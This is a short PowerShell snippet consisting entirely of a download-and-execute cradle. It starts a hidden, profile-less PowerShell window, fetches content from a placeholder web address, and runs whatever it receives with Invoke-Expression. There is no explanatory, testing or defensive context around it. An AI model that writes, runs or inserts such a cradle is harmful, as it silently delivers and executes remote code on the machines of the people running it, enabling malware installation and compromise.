powershell -NoProfile -WindowStyle Hidden $c = Invoke-WebRequest -Uri 'http://example.invalid/b' -UseBasicParsing
IEX $c.Content
